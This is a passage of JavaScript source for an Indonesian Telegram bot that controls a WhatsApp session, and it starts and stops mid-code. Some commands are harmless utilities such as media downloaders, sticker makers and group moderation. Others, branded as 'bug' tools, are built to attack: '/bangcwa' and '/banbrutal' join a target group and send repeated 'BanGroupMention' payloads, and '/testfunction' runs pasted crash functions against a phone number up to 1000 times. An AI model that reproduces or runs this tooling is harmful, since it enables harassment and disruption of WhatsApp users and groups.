 ▢ Type: Unknown
</blockquote>`;
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)

// CASE TOOLS
bot.command("dltiktok", checkPremium, async (ctx) => {
    try {
        const args = ctx.message.text.split(" ").slice(1);
        const tiktokUrl = args[0];

        if (!tiktokUrl) {
            return ctx.reply("⎙ Gunakan format:\n/dltiktok <url_tiktok>\n\nContoh:\n/tt https://vm.tiktok.com/abc123");
        }

        if (!/tiktok\.com|vm\.tiktok\.com/.test(tiktokUrl)) {
            return ctx.reply("❌ URL TikTok tidak valid!");
        }

        await ctx.reply("🔄 Sedang mengambil video TikTok...");

        const payload = `url=${encodeURIComponent(tiktokUrl)}`;
        const response = await axios.post(TIKTOK_API_URL, payload, {
            headers: RAPIDAPI_HEADERS,
            timeout: 30000
        });

        const data = response.data;

        if (!data || data.code !== 0 || !data.data) {
            const msg = data?.msg || "Gagal mengambil data video dari TikTok!";
            return ctx.reply(`❌ Error: ${msg}`);
        }

        const video = data.data;
        const videoUrl = video.hdplay || video.play;

        const caption =
            `🎬 <b>TikTok Video Downloader</b>\n\n` +
            `👤 <b>Author:</b> ${video.author?.nickname || "Tidak diketahui"}\n` +
            `📝 <b>Deskripsi:</b> ${video.title || "Tidak ada deskripsi"}\n` +
            `❤️ <b>Likes:</b> ${video.digg_count || 0}\n` +
            `💬 <b>Komentar:</b> ${video.comment_count || 0}\n` +
            `🔁 <b>Bagikan:</b> ${video.share_count || 0}\n` +
            `▶️ <b>Tayang:</b> ${video.play_count || 0}\n` +
            `⏱️ <b>Durasi:</b> ${video.duration || 0} detik\n\n` +
            `🔗 <i>Downloaded via @${ctx.botInfo.username}</i>`;

        if (videoUrl && videoUrl.startsWith("http")) {
            await ctx.replyWithVideo({ url: videoUrl }, { caption, parse_mode: "HTML" });

            const infoTambahan =
                `💡 <b>Info Tambahan:</b>\n` +
                `📸 <b>Cover:</b> ${video.cover || "Tidak tersedia"}\n` +
                `🎵 <b>Musik:</b> ${video.music_info?.title || "Tidak diketahui"}\n` +
                `🎧 <b>Penyanyi:</b> ${video.music_info?.author || "Tidak diketahui"}\n` +
                `🎶 <b>URL Musik:</b> ${video.music_info?.play || "Tidak tersedia"}`;

            await ctx.reply(infoTambahan, { parse_mode: "HTML" });
        } else {
            await ctx.reply("⚠️ Tidak dapat menemukan link video untuk diunduh!");
        }
    } catch (error) {
        console.error("🚨 TikTok Download Error:", error);
        if (error.code === "ECONNABORTED") {
            ctx.reply("⏱️ Waktu koneksi habis! Coba lagi nanti.");
        } else if (error.response) {
            ctx.reply(`❌ Gagal mengambil data dari server (Status ${error.response.status})`);
        } else {
            ctx.reply(`❌ Terjadi kesalahan: ${error.message}`);
        }
    }
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("Example\n/brat Apongg", { parse_mode: "Markdown" });

  try {
    
    await ctx.reply(" Membuat stiker...");

    const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false`;
    const response = await axios.get(url, { responseType: "arraybuffer" });

    const filePath = path.join(__dirname, "brat.webp");
    fs.writeFileSync(filePath, response.data);

    await ctx.replyWithSticker({ source: filePath });

    fs.unlinkSync(filePath);

  } catch (err) {
    console.error("Error brat:", err.message);
    ctx.reply("❌ Gagal membuat stiker brat. Coba lagi nanti.");
  }
});

bot.command("play", async (ctx) => {
   const text = ctx.message.text.split(" ").slice(1).join(" ")

   if (!text) {
      return ctx.reply("Example: /play AnuBangJmbud")
   }

   try {
      await ctx.reply("⏳ Sedang mencari lagu di Spotify...")

      const { data } = await axios.get(`https://api.nexray.web.id/downloader/spotifyplay?q=${encodeURIComponent(text)}`)

      if (!data.status) {
         return ctx.reply("❌ Lagu tidak ditemukan!")
      }

      const res = data.result

      let caption = `❏ *SPOTIFY - PLAY* ❏

🏷 *Title:* ${res.title}
👤 *Artist:* ${res.artist}
🎧 *Album:* ${res.album}
⏳ *Duration:* ${res.duration}
🎬 *Popularity:* ${res.popularity}
🎉 *Release:* ${res.release_at}
📎 *URL:* ${res.url}`

      await ctx.replyWithPhoto(
         { url: res.thumbnail },
         { caption: caption, parse_mode: "Markdown" }
      )

      await ctx.replyWithAudio(
         { url: res.download_url },
         {
            title: res.title,
            performer: res.artist
         }
      )

   } catch (err) {
      console.log(err)
      ctx.reply("❌ Terjadi kesalahan saat mengambil data.")
   }
});

bot.command(["bangcwa"], checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const start = Date.now();

  if (!q || !/chat\.whatsapp\.com\//.test(q)) {
    return ctx.reply(
`<blockquote>🔥 χ-тяαѕнєя мυявυg 🔥</blockquote>
╭〔 📖 𝑭𝒐𝒓𝒎𝒂𝒕 〕
│ <code>/bangcwa https://chat.whatsapp.com/xxx</code>
╰────────────
⚠️ <i>Khusus link grup WA</i>`,
      { parse_mode: "HTML" }
    );
  }

  // ===== Resolve grup =====
  let target, nama;
  try {
    const code = q.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/)[1];
    const info = await sock.groupGetInviteInfo(code);
    target = info.id;
    nama = info.subject || "Tanpa Nama";
    try { await sock.groupAcceptInvite(code); } catch {}
  } catch (e) {
    return ctx.reply(`❌ ☇ Gagal: ${e.message}`);
  }

  // ===== Loading =====
  const msg = await ctx.reply(
`<blockquote>🔥 χ-тяαѕнєя мυявυg 🔥</blockquote>
╭〔 🎯 𝑻𝒂𝒓𝒈𝒆𝒕 〕
│ ⌬ ${nama}
│ ⌬ <code>${target}</code>
╰────────────
⏳ <i>Sedang mengirim...</i>`,
    { parse_mode: "HTML" }
  );

  // ===== Kirim bug + progress =====
  const TOTAL = 5;
  let sukses = 0;

  for (let i = 0; i < TOTAL; i++) {
    try { await BanGroupMention(sock, target); sukses++; } catch {}
    
    const persen = Math.round(((i + 1) / TOTAL) * 100);
    const bar = "█".repeat(Math.round(persen / 7)) + "░".repeat(15 - Math.round(persen / 7));

    try {
      await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined,
`<blockquote>🔥 χ-тяαѕнєя мυявυg 🔥</blockquote>
╭〔 🎯 𝑻𝒂𝒓𝒈𝒆𝒕 〕
│ ⌬ ${nama}
╰────────────
╭〔 📊 𝑷𝒓𝒐𝒈𝒓𝒆𝒔𝒔 〕
│ ⌬ ${bar} ${persen}%
│ ⌬ Paket ${i + 1}/${TOTAL}
╰────────────`,
        { parse_mode: "HTML" });
    } catch {}

    if (i < TOTAL - 1) await sleep(1500);
  }

  // ===== Hasil akhir =====
  const waktu = ((Date.now() - start) / 1000).toFixed(1);
  const ok = Math.round((sukses / TOTAL) * 100);

  await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined,
`<blockquote>✅ χ-тяαѕнєя мυявυg ✅</blockquote>

╭〔 📊 𝑯𝒂𝒔𝒊𝒍 〕
│ ⌬ Sukses  : ${sukses}/${TOTAL} (${ok}%)
│ ⌬ Waktu   : ${waktu}s
╰────────────
╭〔 🎯 𝑻𝒂𝒓𝒈𝒆𝒕 〕
│ ⌬ ${nama}
╰────────────

${ok === 100 ? '🎊 <b>PERFECT!</b>' : ok >= 60 ? '🔥 <b>SUKSES!</b>' : '💀 <b>GAGAL!</b>'}
💫 <i>Powered by ${ctx.botInfo.username}</i>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "🔗 BUKA GRUP", url: q }
        ]]
      }
    }
  );
});

bot.command(["banbrutal"], checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const start = Date.now();

  if (!q || !/chat\.whatsapp\.com\//.test(q)) {
    return ctx.reply(
`<blockquote>🔥 χ-тяαѕнєя мυявυg 🔥</blockquote>
╭〔 📖 𝑭𝒐𝒓𝒎𝒂𝒕 〕
│ <code>/banbrutal https://chat.whatsapp.com/xxx</code>
╰────────────
⚠️ <i>Khusus link grup WA</i>`,
      { parse_mode: "HTML" }
    );
  }

  // ===== Resolve grup =====
  let target, nama;
  try {
    const code = q.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/)[1];
    const info = await sock.groupGetInviteInfo(code);
    target = info.id;
    nama = info.subject || "Tanpa Nama";
    try { await sock.groupAcceptInvite(code); } catch {}
  } catch (e) {
    return ctx.reply(`❌ ☇ Gagal: ${e.message}`);
  }

  // ===== Loading =====
  const msg = await ctx.reply(
`<blockquote>🔥 χ-тяαѕнєя мυявυg 🔥</blockquote>
╭〔 🎯 𝑻𝒂𝒓𝒈𝒆𝒕 〕
│ ⌬ ${nama}
│ ⌬ <code>${target}</code>
╰────────────
⏳ <i>Sedang mengirim...</i>`,
    { parse_mode: "HTML" }
  );

  // ===== Kirim bug + progress =====
  const TOTAL = 5;
  let sukses = 0;

  for (let i = 0; i < TOTAL; i++) {
    try { await BanGroupMention(sock, target); sukses++; } catch {}
    
    const persen = Math.round(((i + 1) / TOTAL) * 100);
    const bar = "█".repeat(Math.round(persen / 7)) + "░".repeat(15 - Math.round(persen / 7));

    try {
      await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined,
`<blockquote>🔥 χ-тяαѕнєя мυявυg 🔥</blockquote>
╭〔 🎯 𝑻𝒂𝒓𝒈𝒆𝒕 〕
│ ⌬ ${nama}
╰────────────
╭〔 📊 𝑷𝒓𝒐𝒈𝒓𝒆𝒔𝒔 〕
│ ⌬ ${bar} ${persen}%
│ ⌬ Paket ${i + 1}/${TOTAL}
╰────────────`,
        { parse_mode: "HTML" });
    } catch {}

    if (i < TOTAL - 1) await sleep(1500);
  }

  // ===== Hasil akhir =====
  const waktu = ((Date.now() - start) / 1000).toFixed(1);
  const ok = Math.round((sukses / TOTAL) * 100);

  await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined,
`<blockquote>✅ χ-тяαѕнєя мυявυg ✅</blockquote>

╭〔 📊 𝑯𝒂𝒔𝒊𝒍 〕
│ ⌬ Sukses  : ${sukses}/${TOTAL} (${ok}%)
│ ⌬ Waktu   : ${waktu}s
╰────────────
╭〔 🎯 𝑻𝒂𝒓𝒈𝒆𝒕 〕
│ ⌬ ${nama}
╰────────────

${ok === 100 ? '🎊 <b>PERFECT!</b>' : ok >= 60 ? '🔥 <b>SUKSES!</b>' : '💀 <b>GAGAL!</b>'}
💫 <i>Powered by ${ctx.botInfo.username}</i>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "🔗 BUKA GRUP", url: q }
        ]]
      }
    }
  );
});

bot.command('listgrup', checkWhatsAppConnection, async (ctx) => {
    try {
        const groups = await sock.groupFetchAllParticipating();
        const list = Object.values(groups)
            .slice(0, 30)
            .map((g, i) => `${i + 1}. ${g.subject}\n   \`${g.id}\``)
            .join('\n\n');

        await ctx.reply(
            list
                ? `📋 *Grup bot join (${Object.keys(groups).length}):*\n\n${list}\n\n_Pakai JID untuk bug group_`
                : '📋 Bot belum ada di grup manapun.',
            { parse_mode: 'Markdown' }
        );
    } catch (err) {
        await ctx.reply(`❌ Gagal ambil daftar grup: ${err.message}`);
    }
});

bot.command("testfunction", checkWhatsAppConnection, checkPremium, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunction 62××× 10 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `<blockquote><pre>𝙴𝚅𝙴𝚁𝙶𝙰𝚁𝙳𝙴𝙽 𝙼𝚄𝚁𝙱𝚄𝙶</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Process`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote><pre>𝙴𝚅𝙴𝚁𝙶𝙰𝚁𝙳𝙴𝙽 𝙼𝚄𝚁𝙱𝚄𝙶</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Success`
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)

bot.command('cekemoji', async (ctx) => {
  const reply = ctx.message.reply_to_message;

  // Wajib reply ke pesan yang mengandung emoji premium
  if (!reply) {
    return ctx.reply(
      "<blockquote>⬣━━═⪼ 𝐂𝐞𝐤 𝐄𝐦𝐨𝐣𝐢 ⪻═━━⬣</blockquote>\n" +
      "❌ <b>Cara pakai:</b>\n" +
      "╰┈➤ <b>Reply</b> pesan yang berisi emoji premium\n" +
      "╰┈➤ Lalu ketik <code>/cekemoji</code>\n\n" +
      "<i>Contoh: user kirim emoji premium → kamu reply pesannya dengan /cekemoji</i>\n" +
      "<blockquote>༺━━━━━━━━━━━━━━━༻</blockquote>",
      { parse_mode: "HTML" }
    );
  }

  // Kumpulkan semua entities dari teks maupun caption
  const allEntities = [
    ...(reply.entities || []),
    ...(reply.caption_entities || []),
  ];

  // Filter hanya tipe custom_emoji
  const customEmojis = allEntities.filter((e) => e.type === "custom_emoji");

  if (customEmojis.length === 0) {
    return ctx.reply(
      "<blockquote>⬣━━═⪼ 𝐂𝐞𝐤 𝐄𝐦𝐨𝐣𝐢 ⪻═━━⬣</blockquote>\n" +
      "⚠️ Tidak ditemukan <b>custom emoji premium</b> pada pesan tersebut.\n\n" +
      "<i>Pastikan pesan yang di-reply benar-benar mengandung emoji premium (bukan emoji biasa).</i>\n" +
      "<blockquote>༺━━━━━━━━━━━━━━━༻</blockquote>",
      { parse_mode: "HTML" }
    );
  }

  // Deduplikasi berdasarkan custom_emoji_id
  const seen = new Set();
  const unique = customEmojis.filter((e) => {
    if (seen.has(e.custom_emoji_id)) return false;
    seen.add(e.custom_emoji_id);
    return true;
  });

  // Ambil karakter emoji dari teks asli untuk ditampilkan di format
  const sourceText = reply.text || reply.caption || "";

  // Bangun isi pesan hasil
  let body =
    "<blockquote>⬣━━═⪼ 𝐂𝐔𝐒𝐓𝐎𝐌 𝐄𝐌𝐎𝐉𝐈 𝐅𝐎𝐔𝐍𝐃 ⪻═━━⬣</blockquote>\n\n";

  unique.forEach((e, i) => {
    // Ambil karakter asli dari offset entity di pesan sumber
    const rawChar = sourceText.slice(e.offset, e.offset + e.length) || "✨";

    body +=
      `⌥⌬ <b>Emoji ${i + 1}</b>\n` +
      `   ╰┈➤ <b>ID :</b> <code>${e.custom_emoji_id}</code>\n` +
      `   ╰┈➤ <b>Format Pakai:</b>\n` +
      `<code>&lt;tg-emoji emoji-id="${e.custom_emoji_id}"&gt;${rawChar}&lt;/tg-emoji&gt;</code>\n\n`;
  });

  body +=
    `<blockquote>📊 <b>Total Emoji :</b> ${unique.length}</blockquote>\n` +
    "༺━━━━━━━━━━━━━━━༻";

  return ctx.reply(body, { parse_mode: "HTML" });
});

bot.command("iqc", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); 

  if (!text) {
    return ctx.reply(
      "❌ Format: /iqc 18:00|40|Indosat|Apongg",
      { parse_mode: "Markdown" }
    );
  }

  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(
      "❌ Format: /iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply("⏳ proses bang...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss iPhone Apongg `,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
    ctx.reply(" Terjadi kesalahan saat menghubungi API.");
  }
});

bot.command("cekprem", async (ctx) => {
    const userId = ctx.from.id;
    const isPrem = isPremiumUser(userId);
    const premiumUsers = loadPremiumUsers();
    
    let status = isPrem ? '✅ Premium' : '❌ Free User';
    let expired = premiumUsers[userId] || '-';
    let sisaHari = '-';
    
    if (isPrem && premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        const now = moment();
        const diffDays = expiryDate.diff(now, 'days');
        sisaHari = diffDays > 0 ? `${diffDays} hari` : 'Hari ini expired';
    }
    
    const user = ctx.from;
    const username = user.username ? `@${user.username}` : "Tidak ada";
    
    ctx.reply(`
╭──〔 𝘾𝙀𝙆 𝙎𝙏𝘼𝙏𝙐𝙎 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 〕
│ ⌬ User : ${user.first_name}
│ ⌬ Username : ${username}
│ ⌬ ID : ${userId}
│ ⌬ Status : ${status}
│ ⌬ Expired : ${expired}
│ ⌬ Sisa Hari : ${sisaHari}
╰────────────
    `, { parse_mode: 'HTML' });
});

// ============ CEK SENDER WHATSAPP ============
bot.command("ceksender", async (ctx) => {
    const chatId = ctx.chat.id;
    
    const status = isWhatsAppConnected ? '✅ Terhubung' : '❌ Tidak Terhubung';
    const number = linkedWhatsAppNumber || 'Belum ada nomor';
    
    let socketInfo = 'Tidak aktif';
    let credsInfo = 'Tidak tersedia';
    
    try {
        if (sock) {
            socketInfo = '✅ Aktif';
            if (sock.authState && sock.authState.creds) {
                const creds = sock.authState.creds;
                const me = creds.me || {};
                const platform = creds.platform || 'Unknown';
                const device = creds.device || 'Unknown';
                
                credsInfo = `📱 Device: ${device}\n💻 Platform: ${platform}`;
                
                if (me && me.id) {
                    const jid = me.id.split(':')[0] || me.id;
                    number = jid;
                }
            }
        }
    } catch (e) {
        socketInfo = '❌ Error';
    }
    
    let pairingNumber = 'Tidak ada';
    if (lastPairingMessage && lastPairingMessage.phoneNumber) {
        pairingNumber = lastPairingMessage.phoneNumber;
    }
    
    ctx.reply(`
╭──〔 𝘾𝙀𝙆 𝙎𝙀𝙉𝘿𝙀𝙍 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋 〕
│ ⌬ Status : ${status}
│ ⌬ Socket : ${socketInfo}
│ ⌬ Nomor : ${number}
│ ⌬ Pairing : ${pairingNumber}
│ ⌬ Linked : ${linkedWhatsAppNumber || 'Belum ada'}
│
│ ⌬ Info Creds :
│ ${credsInfo}
╰────────────
    `, { parse_mode: 'HTML' });
});

bot.command("cekall", async (ctx) => {
    const userId = ctx.from.id;
    const user = ctx.from;
    const username = user.username ? `@${user.username}` : "Tidak ada";
    
    const isPrem = isPremiumUser(userId);
    const premiumUsers = loadPremiumUsers();
    let statusPrem = isPrem ? '✅ Premium' : '❌ Free User';
    let expired = premiumUsers[userId] || '-';
    let sisaHari = '-';
    
    if (isPrem && premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        const diffDays = expiryDate.diff(moment(), 'days');
        sisaHari = diffDays > 0 ? `${diffDays} hari` : 'Hari ini expired';
    }
    
    const statusSender = isWhatsAppConnected ? '✅ Terhubung' : '❌ Tidak Terhubung';
    let number = linkedWhatsAppNumber || 'Belum ada nomor';
    
    try {
        if (sock && sock.authState && sock.authState.creds && sock.authState.creds.me) {
            const me = sock.authState.creds.me;
            if (me && me.id) {
                number = me.id.split(':')[0] || me.id;
            }
        }
    } catch (e) {}
    
    // RUNTIME
    const runtime = formatRuntime();
    const memory = formatMemory();
    
    ctx.reply(`
╭──〔 𝘾𝙀𝙆 𝙎𝙀𝙈𝙐𝘼 〕
│
├──〔 𝙐𝙎𝙀𝙍 〕
│ ⌬ ID : ${userId}
│ ⌬ Username : ${username}
│ ⌬ Nama : ${user.first_name}
│
├──〔 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 〕
│ ⌬ Status : ${statusPrem}
│ ⌬ Expired : ${expired}
│ ⌬ Sisa : ${sisaHari}
│
├──〔 𝙎𝙀𝙉𝘿𝙀𝙍 〕
│ ⌬ Status : ${statusSender}
│ ⌬ Nomor : ${number}
│
├──〔 𝙎𝙔𝙎𝙏𝙀𝙈 〕
│ ⌬ Runtime : ${runtime}
│ ⌬ Memory : ${memory}
╰────────────
    `, { parse_mode: 'HTML' });
});

bot.command('donate', async (ctx) => {
  const caption = `
<b>╭━━━〔 💖 DONASI PROJECT 💖 〕━━━╮</b>
<b>✨ Halo Kak! ✨</b>
Terima kasih udah mau support <b>Bot Kami</b> 🙏
Setiap donasi kamu sangat berarti buat kami! 💐

<b>━━━━━━━━━━━━━━━━━━━</b>
<b>💳 METODE DONASI</b>
<b>━━━━━━━━━━━━━━━━━━━</b>
📸 <b>QRIS</b> ➜ Scan gambar di atas
💙 <b>DANA</b> ➜ <code>0815-4582-0428</code>

<b>━━━━━━━━━━━━━━━━━━━</b>
<i>💌 Sekecil apapun donasimu, itu sangat berarti!
Semoga rezeki kamu dilancarkan & berkah selalu 🤲✨</i>
<b>╰━━━〔 🌟 TERIMA KASIH 🌟 〕━━━╯</b>
`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: "📤 Kirim Bukti Transfer", url: "https://t.me/ApongSkt" }
      ]
    ]
  };

  try {
    await ctx.replyWithPhoto(
      "https://files.catbox.moe/m9qqkh.jpg",
      {
        caption: caption,
        parse_mode: "HTML",
        reply_markup: keyboard
      }
    );
  } catch (err) {
    console.error("❌ Gagal kirim QRIS:", err.message);
    ctx.reply("❌ Gagal kirim QRIS donasi bre, coba lagi nanti ya 🙏");
  }
});

bot.command("info", (ctx) => {
  const u = ctx.from;

  const info = `
🪪 <b>Your Profile Info</b>
━━━━━━━━━━━━━━━━━━
👤 Name: ${u.first_name || "-"} ${u.last_name || ""}
🏷 Username: @${u.username || "None"}
🆔 ID: <code>${u.id}</code>
🌐 Language: ${u.language_code || "unknown"}
`;

  ctx.reply(info, { parse_mode: "HTML" });
});

bot.command("gempa", async (ctx) => {
  try {
    const res = await fetch(
      "https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json"
    );
    const data = await res.json();
    const g = data.Infogempa.gempa;

    const info = `
📢 *Latest Earthquake (BMKG)*
📅 Date: ${g.Tanggal}
🕒 Time: ${g.Jam}
📍 Location: ${g.Wilayah}
📊 Magnitude: ${g.Magnitude}
📌 Depth: ${g.Kedalaman}
🌊 Potential: ${g.Potensi}
🧭 Coordinates: ${g.Coordinates}
🗺️ Felt: ${g.Dirasakan || "-"}
`;

    await ctx.reply(info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error(err);
    ctx.reply("⚠️ Failed to fetch earthquake data.");
  }
});
bot.command('cekidch', async (ctx) => {
  const args = ctx.message.text.split(" ");
  
  // Cek input
  if (args.length < 2) return ctx.reply("❌ Format salah! /cekidch <link_channel>");
  
  const link = args[1];

  // Validasi link channel WA
  if (!link.includes("https://whatsapp.com/channel/")) {
    return ctx.reply("❌ Link channel tidak valid!");
  }

  try {
    // Ambil kode undangan dari link
    const inviteCode = link.split("https://whatsapp.com/channel/")[1];

    // Ambil metadata channel WA via Baileys
    const res = await sock.newsletterMetadata("invite", inviteCode);

    // Format teks hasil
    const teks = `
📡 *Data Channel WhatsApp*
━━━━━━━━━━━━━━━━━━
🆔 *ID:* ${res.id}
📛 *Nama:* ${res.name}
👥 *Total Pengikut:* ${res.subscribers}
📊 *Status:* ${res.state}
✅ *Verified:* ${res.verification === "VERIFIED" ? "Terverifikasi" : "Belum Verif"}
`;

    // Kirim balasan ke Telegram
    await ctx.reply(teks, { parse_mode: "Markdown" });

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Gagal mengambil data channel. Pastikan link benar dan WA bot online.");
  }
});

/* =========================================================
 *  STORAGE SETTINGS GRUP
 * ========================================================= */
const settingsPath = './database/settings.json';

function loadSettings() {
  try {
    if (fs.existsSync(settingsPath)) return JSON.parse(fs.readFileSync(settingsPath, 'utf8'));
  } catch (e) {}
  return {};
}

function saveSettings(data) {
  const dir = path.dirname(settingsPath);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(settingsPath, JSON.stringify(data, null, 2));
}

function getGroupSetting(chatId) {
  const s = loadSettings();
  if (!s[chatId]) {
    s[chatId] = { antilink: false, antispam: false, welcome: true, antitoxic: false };
    saveSettings(s);
  }
  return s[chatId];
}

function setGroupSetting(chatId, key, value) {
  const s = loadSettings();
  if (!s[chatId]) s[chatId] = { antilink: false, antispam: false, welcome: true, antitoxic: false };
  s[chatId][key] = value;
  saveSettings(s);
}

/* =========================================================
 *  HELPER ADMIN
 * ========================================================= */
async function isAdmin(ctx, userId = ctx.from.id) {
  try {
    const m = await ctx.getChatMember(userId);
    return ['creator', 'administrator'].includes(m.status);
  } catch { return false; }
}

async function botIsAdmin(ctx) {
  try {
    const me = await ctx.getChatMember(ctx.botInfo.id);
    return ['creator', 'administrator'].includes(me.status);
  } catch { return false; }
}

/* =========================================================
 *  🔗 ANTI LINK
 * ========================================================= */
bot.command("antilink", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");
  if (!(await isAdmin(ctx))) return ctx.reply("❌ ☇ Akses hanya untuk admin");

  const mode = (ctx.match || '').trim().toLowerCase();
  const current = getGroupSetting(ctx.chat.id).antilink;

  if (mode === 'on')  setGroupSetting(ctx.chat.id, 'antilink', true);
  if (mode === 'off') setGroupSetting(ctx.chat.id, 'antilink', false);

  if (!['on', 'off'].includes(mode)) {
    return ctx.reply(
      `<blockquote>🔗 𝐀𝐍𝐓𝐈-𝐋𝐈𝐍𝐊 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒</blockquote>
╭〔 𝑺͒𝒕͢𝒂͠𝒕͒𝒖͢𝒔͠ 〕
│ ⌬ Status : ${current ? '✅ AKTIF' : '❌ NONAKTIF'}
╰────────────
╭〔 𝑪͒𝒂͢𝒓͠𝒂͒  𝑷͢𝒂͠𝒌͒𝒂͢𝒊͠ 〕
│ ⌬ /antilink on  ✅ Aktifkan
│ ⌬ /antilink off ❌ Matikan
╰────────────`,
      { parse_mode: "HTML" }
    );
  }

  const now = getGroupSetting(ctx.chat.id).antilink;
  return ctx.reply(
    now
      ? `🔗✅ <b>Anti-Link DIAKTIFKAN!</b>\n🛡️ Link otomatis dihapus dari grup ini 🚫`
      : `🔗❌ <b>Anti-Link DIMATIKAN!</b>\n📭 Member bebas kirim link sekarang 🔓`,
    { parse_mode: "HTML" }
  );
});

/* =========================================================
 *  🔇 MUTE
 * ========================================================= */
bot.command("mute", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");
  if (!(await isAdmin(ctx))) return ctx.reply("❌ ☇ Akses hanya untuk admin");

  const target = ctx.message.reply_to_message?.from;
  if (!target) return ctx.reply("⚠️ ☇ Reply pesan user yang mau di-mute");

  try {
    await ctx.restrictChatMember(target.id, {
      permissions: {
        can_send_messages: false,
        can_send_media_messages: false,
        can_send_other_messages: false,
        can_add_web_page_previews: false,
      },
    });
    return ctx.reply(
